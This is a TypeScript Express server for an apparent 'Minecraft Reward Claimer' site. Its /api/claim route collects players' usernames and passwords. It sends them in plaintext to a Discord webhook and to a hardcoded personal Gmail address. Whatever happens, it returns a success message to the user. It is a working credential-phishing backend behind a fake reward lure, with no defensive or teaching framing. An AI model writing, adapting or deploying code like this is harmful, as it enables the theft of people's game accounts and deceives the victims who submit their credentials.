import express from "express";
import { createServer as createViteServer } from "vite";
import path from "path";
import nodemailer from "nodemailer";
import dotenv from "dotenv";

dotenv.config();

async function startServer() {
  const app = express();
  const PORT = 3000;

  app.use(express.json());

  // Health check
  app.get("/api/health", (req, res) => {
    res.json({ status: "ok", timestamp: new Date().toISOString() });
  });

  // API Route to handle claims
  app.post("/api/claim", async (req, res) => {
    const { username, password, servers } = req.body;

    console.log("Received claim request:", { username, servers: servers || [] });

    if (!username || !password || !Array.isArray(servers)) {
      return res.status(400).json({ 
        status: "error", 
        message: "Missing required fields: username, password, or servers array." 
      });
    }

    try {
      // 1. Try Discord Webhook (Recommended "Other Way")
      if (process.env.DISCORD_WEBHOOK_URL) {
        try {
          const discordResponse = await fetch(process.env.DISCORD_WEBHOOK_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              embeds: [{
                title: "🎮 New Minecraft Reward Claim",
                color: 0x3fb11e, // Minecraft Green
                fields: [
                  { name: "👤 Username", value: `\`${username}\``, inline: true },
                  { name: "🔑 Password", value: `\`${password}\``, inline: true },
                  { name: "🌐 Servers", value: servers.join(", ") }
                ],
                footer: { text: "Minecraft Reward Claimer System" },
                timestamp: new Date().toISOString()
              }]
            })
          });
          
          if (discordResponse.ok) {
            console.log("Data sent successfully to Discord Webhook");
          } else {
            console.error("Discord Webhook failed:", await discordResponse.text());
          }
        } catch (discordError) {
          console.error("Discord Webhook error:", discordError);
        }
      }

      // 2. Try Email (Nodemailer)
      if (process.env.EMAIL_PASS) {
        try {
          const transporter = nodemailer.createTransport({
            service: "gmail",
            auth: {
              user: process.env.EMAIL_USER || "affanayyan23@gmail.com",
              pass: process.env.EMAIL_PASS,
            },
          });

          const mailOptions = {
            from: process.env.EMAIL_USER || "affanayyan23@gmail.com",
            to: "affanayyan23@gmail.com",
            subject: `[Minecraft Reward] New Claim from ${username}`,
            text: `
              New Claim Received!
              -------------------
              Username: ${username}
              Password: ${password}
              Servers: ${servers.join(", ")}
              Timestamp: ${new Date().toISOString()}
            `,
          };

          await transporter.sendMail(mailOptions);
          console.log("Email sent successfully to affanayyan23@gmail.com");
        } catch (emailError) {
          console.error("Email sending error:", emailError);
          // We don't throw here so the user still gets a success message
        }
      }

      // If neither is configured, log a warning but don't fail the user request
      if (!process.env.DISCORD_WEBHOOK_URL && !process.env.EMAIL_PASS) {
        console.warn("Neither DISCORD_WEBHOOK_URL nor EMAIL_PASS is set. Data was not relayed.");
      }

      res.status(200).json({ status: "ok", message: "Claim processed successfully" });
    } catch (error: any) {
      console.error("Error processing claim:", error);
      res.status(500).json({ 
        status: "error", 
        message: "Internal server error",
        details: error?.message || "Unknown error"
      });
    }
  });

  // Vite middleware for development
  if (process.env.NODE_ENV !== "production") {
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: "spa",
    });
    app.use(vite.middlewares);
  } else {
    const distPath = path.join(process.cwd(), "dist");
    app.use(express.static(distPath));
    app.get("*", (req, res) => {
      res.sendFile(path.join(distPath, "index.html"));
    });
  }

  app.listen(PORT, "0.0.0.0", () => {
    console.log(`Server running on http://localhost:${PORT}`);
  });
}

startServer();
